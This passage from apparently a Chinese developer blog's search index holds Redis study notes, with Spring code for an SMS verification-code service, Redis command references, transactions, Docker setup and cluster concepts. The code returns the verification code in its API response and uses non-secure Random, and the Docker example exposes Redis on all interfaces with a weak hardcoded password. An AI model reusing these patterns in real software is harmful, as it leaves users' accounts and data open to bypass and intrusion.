class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UmsMemberServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UmsMemberService</span> &#123;<br><br><span class="hljs-comment">// 注入 RedServiceImpl</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RedisService</span> redisService;<br>    <br>    <span class="hljs-comment">// 获取 Redis 验证码的 key 前缀</span><br>    <span class="hljs-meta">@Value</span>(<span class="hljs-string">&quot;$&#123;redis.key.prefix.authCode&#125;&quot;</span>)<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> <span class="hljs-variable constant_">REDIS_KEY_PREFIX_AUTH_CODE</span>;<br>    <br><span class="hljs-comment">// 获取验证码的有效期</span><br>    <span class="hljs-meta">@Value</span>(<span class="hljs-string">&quot;$&#123;redis.key.expire.authCode&#125;&quot;</span>)<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Long</span> <span class="hljs-variable constant_">AUTH_CODE_EXPIRE_SECONDS</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">CommonResult</span> <span class="hljs-title function_">generateAuthCode</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> telephone</span>) &#123;<br>        <span class="hljs-title class_">StringBuilder</span> sb = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-title class_">Random</span> random = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>            sb.<span class="hljs-title function_">append</span>(random.<span class="hljs-title function_">nextInt</span>(<span class="hljs-number">10</span>));<br>        &#125;<br>        <span class="hljs-comment">//验证码绑定手机号并存储到redis</span><br>redisService.<span class="hljs-title function_">set</span>(<br><span class="hljs-variable constant_">REDIS_KEY_PREFIX_AUTH_CODE</span> + telephone, <br>sb.<span class="hljs-title function_">toString</span>(), <br><span class="hljs-variable constant_">AUTH_CODE_EXPIRE_SECONDS</span><br>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">CommonResult</span>.<span class="hljs-title function_">success</span>(sb.<span class="hljs-title function_">toString</span>(), <span class="hljs-string">&quot;获取验证码成功&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//对输入的验证码进行校验</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">CommonResult</span> <span class="hljs-title function_">verifyAuthCode</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> telephone, <span class="hljs-title class_">String</span> authCode</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">StrUtil</span>.<span class="hljs-title function_">isEmpty</span>(authCode)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CommonResult</span>.<span class="hljs-title function_">failed</span>(<span class="hljs-string">&quot;请输入验证码&quot;</span>);<br>        &#125;<br>        <span class="hljs-title class_">String</span> realAuthCode = (<span class="hljs-title class_">String</span>) redisService.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">REDIS_KEY_PREFIX_AUTH_CODE</span> + telephone);<br>        <span class="hljs-built_in">boolean</span> result = authCode.<span class="hljs-title function_">equals</span>(realAuthCode);<br>        <span class="hljs-keyword">if</span> (result) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CommonResult</span>.<span class="hljs-title function_">success</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;验证码校验成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">CommonResult</span>.<span class="hljs-title function_">failed</span>(<span class="hljs-string">&quot;验证码不正确&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-2-4-Controller-执行操作"><a href="#2-2-4-Controller-执行操作" class="headerlink" title="2.2.4. Controller 执行操作"></a>2.2.4. Controller 执行操作</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Controller</span><br><span class="hljs-variable">@Api</span>(tags = <span class="hljs-string">&quot;UmsMemberController&quot;</span>)<br><span class="hljs-variable">@Tag</span>(name = <span class="hljs-string">&quot;UmsMemberController&quot;</span>, description = <span class="hljs-string">&quot;会员登录注册管理&quot;</span>)<br><span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">&quot;/sso&quot;</span>)<br>public class UmsMemberController &#123;<br>    <span class="hljs-variable">@Autowired</span><br>    private UmsMemberService memberService;<br><br>    <span class="hljs-variable">@ApiOperation</span>(<span class="hljs-string">&quot;获取验证码&quot;</span>)<br>    <span class="hljs-variable">@RequestMapping</span>(value = <span class="hljs-string">&quot;/getAuthCode&quot;</span>, method = RequestMethod.GET)<br>    <span class="hljs-variable">@ResponseBody</span><br>    public CommonResult <span class="hljs-built_in">getAuthCode</span>(<span class="hljs-variable">@RequestParam</span> String telephone) &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">memberService</span><span class="hljs-selector-class">.generateAuthCode</span>(telephone);<br>    &#125;<br><br>    @<span class="hljs-selector-tag">ApiOperation</span>(<span class="hljs-string">&quot;判断验证码是否正确&quot;</span>)<br>    @<span class="hljs-selector-tag">RequestMapping</span>(value = <span class="hljs-string">&quot;/verifyAuthCode&quot;</span>, method = RequestMethod.POST)<br>    @<span class="hljs-selector-tag">ResponseBody</span><br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">CommonResult</span> <span class="hljs-selector-tag">updatePassword</span>(<span class="hljs-variable">@RequestParam</span> String telephone,<br>                                       <span class="hljs-variable">@RequestParam</span> String authCode) &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">memberService</span><span class="hljs-selector-class">.verifyAuthCode</span>(telephone,authCode);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数据股那里</category>
      
      <category>非关系型数据库</category>
      
      <category>键值型</category>
      
      <category>Redis</category>
      
      <category>Spring Data Redis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Redis 基础</title>
    <link href="/2025/05/17/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/05/17/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><h2 id="1-导图：Map：Redis"><a href="#1-导图：Map：Redis" class="headerlink" title="1. 导图：Map：Redis"></a>1. 导图：<a href="Map%EF%BC%9ARedis.xmind">Map：Redis</a></h2><hr><h2 id="2-Redis-语法"><a href="#2-Redis-语法" class="headerlink" title="2. Redis 语法"></a>2. Redis 语法</h2><h3 id="2-1-系统命令"><a href="#2-1-系统命令" class="headerlink" title="2.1. 系统命令"></a>2.1. 系统命令</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 1. 心跳命令（检测该客户端与 Redis 的连接是正常）</span><br><span class="hljs-built_in">ping</span><br></code></pre></td></tr></table></figure><h3 id="集群命令"><a href="#集群命令" class="headerlink" title="集群命令"></a>集群命令</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><br>主从集群的哦，其他的无效<br>可以动态设置，比如在 Redis 启动后执行：<br>replicaof 192.168.1.100 6379<br><br>要取消从属关系，恢复成主节点，执行：<br>replicaof <span class="hljs-keyword">no</span> <span class="hljs-keyword">one</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-2-字符串键值对命令"><a href="#2-2-字符串键值对命令" class="headerlink" title="2.2. 字符串键值对命令"></a>2.2. 字符串键值对命令</h3><p>&#x3D;&#x3D;1.插入字符串键值对&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 设置单个键值对</span><br><span class="hljs-built_in">set</span> key value [NX|XX] [GET] [EX seconds|PX milliseconds|EXAT unix-time-seconds|PXAT unix-time-milliseconds|KEEPTTL]<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. NX：</span><br><span class="hljs-string">1. 仅在键不存在时设置，等价于插入操作</span><br><span class="hljs-string">2. XX：</span><br><span class="hljs-string">1. 仅在键已存在时设置，等价于更新操作</span><br><span class="hljs-string">3. GET: </span><br><span class="hljs-string">1. 设置新值前，返回键当前的值（若不存在返回 `nil`），便于获取旧值做对比</span><br><span class="hljs-string">4. EX seconds：</span><br><span class="hljs-string">1. 设置键在指定 “秒数” 后过期（相对时间）</span><br><span class="hljs-string">5. PX milliseconds：</span><br><span class="hljs-string">1. 设置键在指定 “毫秒数” 后过期（相对时间）</span><br><span class="hljs-string">6. EXAT timestamp: </span><br><span class="hljs-string">1. 设置键在指定 “秒级 Unix 时间戳” 时过期（绝对时间）</span><br><span class="hljs-string">7. PXAT milliseconds-timestamp: </span><br><span class="hljs-string">1. 设置键在指定 “毫秒级 Unix 时间戳” 时过期（绝对时间）</span><br><span class="hljs-string">8. KEEPTTL: </span><br><span class="hljs-string">1. 在更新键值时保留其原有 TTL（生存时间）不变</span><br><span class="hljs-string">2. 不能与任何过期时间参数（如 EX、PX、EXAT、PXAT）同时使用——要么保留现有 TTL，要么设置新的过期时间，二者不可兼得。</span><br><span class="hljs-string">9. 举例：</span><br><span class="hljs-string">1. SET mykey &quot;hello&quot; NX EX 10</span><br><span class="hljs-string">2. SET session_token &quot;abc123&quot; EXAT 1717155600</span><br><span class="hljs-string">3. SET cache_result &quot;ok&quot; PXAT 1717155600123</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 批量设置多个键值对</span><br>MSET key1 value1 key2 value2 key3 value3<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 举例：</span><br><span class="hljs-string">1. MSET user:1 &quot;Alice&quot; user:2 &quot;Bob&quot; user:3 &quot;Carol&quot;</span><br><span class="hljs-string">2. 注意事项：</span><br><span class="hljs-string">1. 不同于 Redis 管道（Pipeline），其是多条命令批量发送，非原子的</span><br><span class="hljs-string">2. 而此命令是原子性的，一条命令设置多个键值对，所有键值对要么全部设置成功，要么全部失败</span><br><span class="hljs-string">3. 当你使用 MSET 设置多个键时，不能使用 [NX|XX|GET|EX|PX|EXAT|PXAT|KEEPTTL] 这些选项</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 3. 批量设置多个键值对（所有键必须不存在）</span><br>MSETNX key1 val1 key2 val2 key3 val3<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 注意事项：</span><br><span class="hljs-string">1. 所有键都不存在时才执行，否则一个都不设置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除字符串键值对&#x3D;&#x3D;</p><p>&#x3D;&#x3D;3.修改字符串键值对&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 数值操作（必须是数值字符串）</span><br><span class="hljs-attribute">SET</span> visits <span class="hljs-number">100</span>    # 初始值：<span class="hljs-number">100</span><br><span class="hljs-attribute">INCR</span> visits       # 数字递增：<span class="hljs-number">101</span><br><span class="hljs-attribute">INCRBY</span> visits <span class="hljs-number">50</span>  # 增加指定的整数：<span class="hljs-number">151</span><br><span class="hljs-attribute">DECR</span> visits       # 数字递减：<span class="hljs-number">150</span><br><span class="hljs-attribute">DECRBY</span> visits <span class="hljs-number">20</span>  # 减少指定的整数：<span class="hljs-number">130</span><br><br><br><span class="hljs-comment"># 2. 字符串追加</span><br><span class="hljs-attribute">APPEND</span> mykey <span class="hljs-string">&quot;world&quot;</span>  # 在末尾追加 <span class="hljs-string">&quot;world&quot;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.查询字符串键值对&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查询单个值</span><br>get key<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 举例：</span><br><span class="hljs-string">1. get name</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 批量查询多个值</span><br>MGET key1 key2 key3<br><br><br><span class="hljs-comment"># 3. 获取字符串长度</span><br>STRLEN mykey<br><br><br><span class="hljs-comment"># 4. 查询剩余生存时间（以秒为单位）</span><br>System.out.println(Long.toString(System.currentTimeMillis()/<span class="hljs-number">1000</span>L));<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.其他命令&#x3D;&#x3D;</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing"># <span class="hljs-number">1.</span> 先 <span class="hljs-built_in">get</span> 再 <span class="hljs-built_in">set</span><br>getset <span class="hljs-built_in">key</span> value<br></code></pre></td></tr></table></figure><hr><h2 id="3-Redis-管道"><a href="#3-Redis-管道" class="headerlink" title="3. Redis 管道"></a>3. Redis 管道</h2><p>Redis 管道是 Redis 提供的一种批量发送命令的机制，其核心目的是减少客户端与服务器之间的网络往返次数，从而显著提升性能。</p><p>比如执行如下命令，其处理流程是：客户端发送请求 ➜ 服务器接收并处理 ➜ 服务器返回结果 ➜ 客户端等待接收：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">SET</span> name <span class="hljs-comment">&quot;Alice&quot;</span><br></code></pre></td></tr></table></figure><p>如果你连续发送 100 条命令，这个过程就得重复 100 次，网络延迟就会成为严重瓶颈。而使用管道机制，我们可以一次性把这 100 条命令打包发送，Redis 也会一口气处理完所有请求，然后将结果一并返回，效率大幅提升。</p><p>我们常常在 Java 代码中使用 Redis 管道操作（Pipelining）来提升性能：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 以 Jedis 为例</span><br>Jedis jedis = <span class="hljs-keyword">new</span> Jedis(<span class="hljs-string">&quot;localhost&quot;</span>);<br>Pipeline pipeline = jedis.pipelined();<br><br>pipeline.<span class="hljs-keyword">set</span>(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value1&quot;</span>);<br>pipeline.<span class="hljs-keyword">set</span>(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);<br>pipeline.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;key1&quot;</span>);<br><br><span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">Object</span>&gt; results = pipeline.syncAndReturnAll();<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>管道不同于事务机制，它不具备原子性，也不能回滚，仅仅是提高通信效率、批量发送的一种手段</li></ol></blockquote><hr><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h2 id="1-服务把控"><a href="#1-服务把控" class="headerlink" title="1. 服务把控"></a>1. 服务把控</h2><h3 id="1-1-线程特性"><a href="#1-1-线程特性" class="headerlink" title="1.1. 线程特性"></a>1.1. 线程特性</h3><p>Redis 采用的是 “<strong>主线程执行命令 + 多线程处理部分辅助功能</strong>” 的架构。在数据读写方面，Redis 始终坚持使用一个主线程来执行命令。由于 Redis 直接操作的是内存，访问速度极快，即使只用单线程处理，也能获得非常高的性能。更关键的是，单线程模式无需考虑线程安全问题，不需要加锁，从而避免了锁竞争等开销，反而执行效率更高。</p><p>而针对一些可能拖慢主线程性能的任务，Redis 引入了 <strong>多线程或后台子进程</strong> 来“分担杂活”，提高整体响应能力，例如：</p><ol><li>&#x3D;&#x3D;网络 I&#x2F;O 处理&#x3D;&#x3D;：<ol><li>从 Redis 6.0 起，可在配置文件中通过 <code>io-threads</code> 参数启动若干专用网络线程（默认关闭）。</li><li>这些线程负责客户端的请求、建立连接、协议解析和回复发送，真正的主线程只调度命令执行，IO 线程直接做数据收发，避免高并发时主线程在网络上“排队”。</li></ol></li><li>&#x3D;&#x3D;异步删除大 Key&#x3D;&#x3D;：<ol><li>当删除非常大的对象（如超长列表、巨型哈希）时，命令执行后主线程只标记删除，并将释放内存的任务提交给后台“懒卸载”线程（通过 <code>lazyfree-threads</code> 配置）。</li><li>这些线程在空闲时异步清理对象，避免主线程因一次性大规模内存释放而卡顿。</li></ol></li><li>&#x3D;&#x3D;集群通信、数据同步相关的任务&#x3D;&#x3D;：<ol><li>在集群模式下，节点间心跳维护、槽迁移、故障检测等通信都由集群总线线程异步处理，主线程仅负责本地命令执行。</li><li>在主从模式下，主节点有专门的 I&#x2F;O 线程向从节点推送复制流，从节点也有 I&#x2F;O 线程接收。</li></ol></li><li>&#x3D;&#x3D;持久化&#x3D;&#x3D;：<ol><li>虽然 Redis 把数据放在内存中，但它也会周期性地将数据持久化到磁盘，比如通过 RDB 快照或 AOF 日志</li><li>这些写磁盘的操作相对耗时，因此 Redis 主进程 <code>fork()</code> 出一个子进程，该子进程负责异步进行持久化</li></ol></li></ol><hr><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><h3 id="2-1-单机测试"><a href="#2-1-单机测试" class="headerlink" title="2.1. 单机测试"></a>2.1. 单机测试</h3><h4 id="2-1-1-集群特性"><a href="#2-1-1-集群特性" class="headerlink" title="2.1.1. 集群特性"></a>2.1.1. 集群特性</h4><h5 id="2-1-1-1-事务支持"><a href="#2-1-1-1-事务支持" class="headerlink" title="2.1.1.1. 事务支持"></a>2.1.1.1. 事务支持</h5><p>Redis 的事务机制本质上是<strong>单机级别的</strong>，在 Redis Cluster 模式下，其使用受到一定限制，不能保证跨节点的原子性</p><p>当我们调用 <code>MULTI</code> 时，表示开启一个事务，接下来的命令将依次进入事务队列，此时 Redis 不执行这些命令，而是返回 <code>QUEUED</code> 表示排队成功。直到我们执行 <code>EXEC</code>，所有排队命令才会被按顺序执行，并且执行期间不会被其他客户端打断，从而实现 “顺序一致、不可中断” 的效果</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">WATCH account_A balance_B         <span class="hljs-comment"># 开始监视一个或多个 key，直到事务执行（EXEC）或被显式放弃（DISCARD）</span><br>val_A = GET account_A<br>val_B = GET balance_B<br><br><span class="hljs-keyword">if</span> val_A &gt;= <span class="hljs-number">100</span>:                   <br>    MULTI                         <span class="hljs-comment"># 开启事务</span><br>    DECRBY account_A <span class="hljs-number">100</span>          <span class="hljs-comment"># 发送多个命令（排队）</span><br>    INCRBY balance_B <span class="hljs-number">100</span><br>    EXEC                          <span class="hljs-comment"># 提交事务</span><br><span class="hljs-keyword">else</span>:<br>    DISCARD                       <span class="hljs-comment"># 余额不足，放弃事务</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 注意事项：</span><br><span class="hljs-string">1. 如果在 WATCH 到 EXEC 之间，监视的任意 key被其他客户端修改了，事务提交时会自动失败（EXEC 返回 nil），但事务队列不会自动取消（简单来说：只是提交失败，事务不会自动取消），而 DISCARD 是让我们主动放弃事务 + 取消监视</span><br><span class="hljs-string">2. 事务不是数据库那种全回滚事务，而是一旦某条命令出错，其前后命令仍然会照常执行，不会回滚。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-1-2-Docker-环境部署"><a href="#2-1-2-Docker-环境部署" class="headerlink" title="2.1.2. Docker 环境部署"></a>2.1.2. Docker 环境部署</h4><p>&#x3D;&#x3D;1.创建宿主机数据挂载目录&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/data/redis<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.启动 Redis 容器&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -d \<br>  --name redis \<br>  -p <span class="hljs-number">6379</span>:<span class="hljs-number">6379</span> \<br>  -v <span class="hljs-regexp">/mystudy/</span>data<span class="hljs-regexp">/redis:/</span>data \<br>  redis:latest \<br>  redis-server --appendonly yes --bind <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> --requirepass wq666666<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. --appendonly yes</span><br><span class="hljs-string">1. 开启 AOF（Append Only File）持久化模式，简单可靠，适合这个场景</span><br><span class="hljs-string">2. --bind 0.0.0.0</span><br><span class="hljs-string">1. 监听所有网卡</span><br><span class="hljs-string">2. Redis 默认只监听 127.0.0.1，也就是说只有通过本机地址 127.0.0.1:6379 才能访问它，哪怕你用本机的其他 IP（比如 192.168.136.8:6379）也无法连接。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="主从集群"><a href="#主从集群" class="headerlink" title="主从集群"></a>主从集群</h3><h4 id="集群概述"><a href="#集群概述" class="headerlink" title="集群概述"></a>集群概述</h4><p>主从集群是 Redis 最经典的集群模式，通常为一主多从架构：数据仅写入唯一的主节点，从节点通过复制机制同步主节点的数据，整个集群中只有一条主从复制链：</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250601162731128.png"></p><p>即使构建出多个主从组合的“多主多从”结构，其本质仍是伪多主：各主节点之间没有任何协调机制，彼此独立，数据完全隔离，甚至不具备 Redis Cluster 所支持的数据分片能力。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250601162633830.png"></p><hr><h4 id="集群特性"><a href="#集群特性" class="headerlink" title="集群特性"></a>集群特性</h4><h5 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h5><hr><h3 id="2-2-Redis-Cluster-集群"><a href="#2-2-Redis-Cluster-集群" class="headerlink" title="2.2. Redis Cluster 集群"></a>2.2. Redis Cluster 集群</h3><h4 id="2-2-1-集群概述"><a href="#2-2-1-集群概述" class="headerlink" title="2.2.1. 集群概述"></a>2.2.1. 集群概述</h4><p>Redis Cluster 是 Redis 官方提供的开源集群解决方案，通常采用主从架构搭建，并需要我们手动进行运维管理。它的最大特点在于，数据在写入时会被自动按哈希槽进行分区，直接分配到不同的主节点，随后，各主节点的数据由对应的从节点进行同步,而非像传统的大数据系统那样先进行分库分表处理。</p><hr><h4 id="2-2-2-集群特性"><a href="#2-2-2-集群特性" class="headerlink" title="2.2.2. 集群特性"></a>2.2.2. 集群特性</h4><h5 id="2-2-2-1-数据同步（单体一致性）"><a href="#2-2-2-1-数据同步（单体一致性）" class="headerlink" title="2.2.2.1. 数据同步（单体一致性）"></a>2.2.2.1. 数据同步（单体一致性）</h5><p>采用的是异步复制——主节点在写入成功后会立即返回；如果此时主节点宕机，而从节点尚未完成同步却被提升为主节点，就会导致数据丢失。这与 MySQL 类似，同样最多只能保障 <strong>单体一致性</strong>，实现分布式一致性中的 <strong>最终一致性</strong>，无法满足真正的强一致性的要求。</p><p>尽管在很多使用场景下，相比 MySQL，我们对 Redis 中数据的“是否存在”或“是否最新”已经更宽容一些，但对于诸如金融交易、秒杀等对一致性要求极高的业务场景，这种宽容是不可接受的，我们仍然必须追求严格的分布式一致性。</p><hr><h5 id="2-2-2-2-数据分布"><a href="#2-2-2-2-数据分布" class="headerlink" title="2.2.2.2. 数据分布"></a>2.2.2.2. 数据分布</h5><p>Redis Cluster 采用虚拟槽分区，所有键通过哈希函数（<code>CRC16[key] &amp; 16383</code>）映射到编号为 0 到 16383 的槽内，共计 16384 个槽（编号从 0 开始）<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250530162454124.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>数据仅分布在主节点上，不直接分区到从节点；从节点仅负责从对应主节点同步数据</li></ol></blockquote><hr><h5 id="2-2-2-3-事务支持"><a href="#2-2-2-3-事务支持" class="headerlink" title="2.2.2.3. 事务支持"></a>2.2.2.3. 事务支持</h5><p>Redis Cluster 只支持同一个节点（slot）内的事务操作，跨节点时会立即报错</p><p>这是因为 Redis Cluster 采用了<strong>虚拟槽位（hash slot）分区机制</strong>：每个 key 会通过哈希函数映射到某个槽位（slot），再由系统将槽位分配给不同的 Redis 节点。例如，以下命令：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">MSET <span class="hljs-keyword">user</span>:<span class="hljs-number">1</span>:<span class="hljs-type">name</span> Alice <span class="hljs-keyword">user</span>:<span class="hljs-number">2</span>:<span class="hljs-type">name</span> Bob<br></code></pre></td></tr></table></figure><p>如果 <code>user:1:name</code> 和 <code>user:2:name</code> 分别落在不同的槽位（slot），即分布在不同的节点上，Redis 会直接返回错误：<code>CROSSSLOT Keys in request don&#39;t hash to the same slot</code></p><p>如果项目对性能要求不高但需要强一致性的事务，使用单节点 Redis 即可满足需求；但如果系统规模较大且需要支持分布式事务，就需要考虑其他架构方案，而不是依赖 Redis Cluster 来解决（或许 Redis 初衷就算不是强一致性）</p><hr><h5 id="2-2-2-4-集群限制"><a href="#2-2-2-4-集群限制" class="headerlink" 